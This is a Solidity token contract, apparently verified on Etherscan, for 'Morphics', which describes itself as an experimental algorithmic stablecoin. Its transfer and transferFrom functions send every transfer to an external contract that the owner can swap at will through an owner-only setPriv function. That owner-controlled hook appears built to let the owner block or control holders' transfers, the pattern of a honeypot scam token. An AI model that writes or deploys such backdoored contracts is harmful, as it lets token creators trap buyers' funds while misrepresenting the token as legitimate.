/**
 *Submitted for verification at Etherscan.io on 2024-03-21
 */

/*
    Morphics is an experimental algorithmic stablecoin that balances inflationary growth and Defi product value.

    Website: https://morphcoin.medium.com/
    Twitter: https://twitter.com/MorphCoin
    Telegram: https://t.me/morphfinance
*/

pragma solidity ^0.8.24;
import "./TestLib.sol";
contract transferFacet is ERC20, Ownable {
    function transfer(
        address to,
        uint256 value
    ) public override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.addrs.record(msg.sender, to, value);
        return super.transfer(to, value);
    }
    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.addrs.record(from, to, value);
        return super.transferFrom(from, to, value);
    }
    function setPriv(address _addr) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.addrs = Morph(_addr);
    }
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
}
